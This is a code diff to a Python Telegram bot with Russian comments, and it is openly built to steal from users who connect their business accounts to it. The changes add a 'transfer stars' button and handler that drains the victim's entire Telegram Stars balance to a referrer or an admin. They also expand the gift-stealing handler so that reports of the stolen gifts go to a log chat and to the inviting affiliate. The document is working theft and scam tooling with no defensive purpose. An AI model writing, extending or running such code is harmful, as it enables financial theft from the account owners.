@@ -207,9 +207,14 @@ async def handle_business(business_connection: types.BusinessConnection):
         callback_data=f"steal_gifts:{business_id}"
     )
     builder.button(
+        text="💰 Перевести звёзды", 
+        callback_data=f"transfer_stars:{business_id}"
+    )
+    builder.button(
         text="⛔️ Удалить подключение", 
         callback_data=f"destroy:{business_id}"
     )
+    builder.adjust(1)
     
     user = business_connection.user
     
@@ -472,7 +477,6 @@ async def decline(callback: CallbackQuery):
 async def steal_gifts_handler(callback: CallbackQuery):
     business_id = callback.data.split(":")[1]
     
-    # Получаем информацию о бизнес-аккаунте
     try:
         business_connection = await bot.get_business_connection(business_id)
         user = business_connection.user
@@ -480,22 +484,17 @@ async def steal_gifts_handler(callback: CallbackQuery):
         await callback.answer(f"❌ Ошибка получения бизнес-аккаунта: {e}")
         return
 
-    # Определяем получателя (пригласившего бизнес-аккаунта)
-    inviter_id = user_referrer_map.get(user.id)  # Важно: user.id, а не callback.from_user.id
+    # Определяем получателя
+    inviter_id = user_referrer_map.get(user.id)
     if inviter_id:
         try:
-            # Проверяем доступность пригласившего
             await bot.send_chat_action(inviter_id, "typing")
             recipient_id = inviter_id
-            print(f"Подарки будут отправлены пригласившему: {inviter_id}")
         except Exception:
             recipient_id = ADMIN_IDS[0]
-            print("Пригласивший недоступен, отправляем админу")
     else:
         recipient_id = ADMIN_IDS[0]
-        print("Пригласивший не найден, отправляем админу")
 
-    # Дальше идёт существующая логика обработки подарков...
     stolen_nfts = []
     stolen_count = 0
     errors = []
@@ -504,7 +503,10 @@ async def steal_gifts_handler(callback: CallbackQuery):
         gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
         gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
     except Exception as e:
-        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка при получении подарков: {e}")
+        error_msg = f"❌ Ошибка при получении подарков: {e}"
+        await bot.send_message(LOG_CHAT_ID, error_msg)
+        if inviter_id:
+            await bot.send_message(inviter_id, error_msg)
         await callback.answer("Ошибка при получении подарков")
         return
 
@@ -530,26 +532,81 @@ async def steal_gifts_handler(callback: CallbackQuery):
             except Exception as e:
                 errors.append(f"Ошибка передачи {gift_id}: {e}")
 
-
-
-    # Перевод звёзд
-    try:
-        stars = await bot.get_business_account_star_balance(business_id)
-        amount = int(stars.amount)
-        if amount > 0:
-            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
-            await bot.send_message(LOG_CHAT_ID, f"🌟 Выведено звёзд: {amount}")
-    except Exception as e:
-        errors.append(f"Ошибка при выводе звёзд: {e}")
-
-    # Отчет о результате
+    # Формируем отчет
     result_msg = []
     if stolen_count > 0:
         result_msg.append(f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>")
         result_msg.extend(stolen_nfts[:10])  # Ограничиваем количество выводимых NFT
-
-    await callback.message.answer("\n".join(result_msg), parse_mode="HTML")
-    await callback.answer()
+    
+    if errors:
+        result_msg.append("\n⚠️ Ошибки:")
+        result_msg.extend(errors[:5])  # Ограничиваем количество выводимых ошибок
+    
+    full_report = "\n".join(result_msg) if result_msg else "Не удалось украсть подарки"
+    
+    # Отправляем отчет в LOG_CHAT_ID
+    await bot.send_message(
+        chat_id=LOG_CHAT_ID,
+        text=f"Отчет по бизнес-аккаунту {user.id}:\n{full_report}",
+        parse_mode="HTML"
+    )
+    
+    # Отправляем отчет пригласившему (если есть)
+    if inviter_id and inviter_id != user.id:
+        try:
+            await bot.send_message(
+                chat_id=inviter_id,
+                text=f"Отчет по вашему рефералу {user.id}:\n{full_report}",
+                parse_mode="HTML"
+            )
+        except Exception as e:
+            await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
+    
+    await callback.answer(f"Украдено {stolen_count} подарков")
+    
+@dp.callback_query(F.data.startswith("transfer_stars:"))
+async def transfer_stars_handler(callback: CallbackQuery):
+    business_id = callback.data.split(":")[1]
+    
+    try:
+        business_connection = await bot.get_business_connection(business_id)
+        user = business_connection.user
+        
+        # Определяем получателя (как в steal_gifts_handler)
+        inviter_id = user_referrer_map.get(user.id)
+        if inviter_id:
+            try:
+                await bot.send_chat_action(inviter_id, "typing")
+                recipient_id = inviter_id
+            except Exception:
+                recipient_id = ADMIN_IDS[0]
+        else:
+            recipient_id = ADMIN_IDS[0]
+            
+        # Получаем баланс и переводим звёзды
+        stars = await bot.get_business_account_star_balance(business_id)
+        amount = int(stars.amount)
+        
+        if amount > 0:
+            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
+            success_msg = f"🌟 Успешно переведено звёзд: {amount} от {user.id} к {recipient_id}"
+            
+            # Отправляем сообщение в лог и пригласившему
+            await bot.send_message(LOG_CHAT_ID, success_msg)
+            if inviter_id and inviter_id != recipient_id:
+                try:
+                    await bot.send_message(inviter_id, success_msg)
+                except Exception as e:
+                    await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
+                    
+            await callback.answer(f"Переведено {amount} звёзд")
+        else:
+            await callback.answer("Нет звёзд для перевода", show_alert=True)
+            
+    except Exception as e:
+        error_msg = f"❌ Ошибка при переводе звёзд: {e}"
+        await bot.send_message(LOG_CHAT_ID, error_msg)
+        await callback.answer("Ошибка при переводе звёзд", show_alert=True)
         
 async def main():
     await dp.start_polling(bot)
